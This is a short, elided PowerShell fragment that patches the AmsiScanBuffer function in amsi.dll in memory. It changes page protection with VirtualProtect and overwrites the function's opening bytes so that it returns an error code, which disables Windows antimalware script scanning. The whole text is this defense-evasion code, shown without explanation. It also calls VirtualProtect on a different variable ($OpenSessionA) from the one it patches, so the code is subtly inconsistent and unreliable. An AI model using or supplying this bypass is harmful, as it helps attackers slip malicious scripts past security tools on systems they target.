...
$ScanBufferA = lookupFunc amsi.dll AmsiScanBuffer
...
$VirtualProtect.Invoke($OpenSessionA, 6, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ScanBufferA, 6)
$VirtualProtect.Invoke($OpenSessionA, 6, 0x20, [ref]$oldProtectionBuffer)